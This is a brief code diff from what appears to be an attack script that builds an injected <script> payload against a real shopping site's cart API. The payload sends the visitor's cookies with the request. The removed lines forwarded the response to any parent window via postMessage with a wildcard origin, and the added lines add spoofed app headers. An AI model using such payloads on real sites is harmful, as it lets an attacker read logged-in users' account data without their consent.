@@ -22,17 +22,20 @@ function run(){
 let payload = `
 <script>
 
-fetch("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",{
-credentials:"include"
+fetch(url,{
+method:"GET",
+credentials:"include",
+headers:{
+"Accept":"application/json, text/plain, */*",
+"Personalized":"1",
+"utm_source":"direct",
+"utm_medium":"direct",
+"utm_campaign":"direct",
+"source_type":"504",
+"s_channel":"h5_m",
+"s_pkg_version":"20000"
+}
 })
-.then(r=>r.text())
-.then(d=>{
-parent.postMessage(d,"*")
-})
-.catch(e=>{
-parent.postMessage(e.toString(),"*")
-})
-
 <\/script>
 `
 
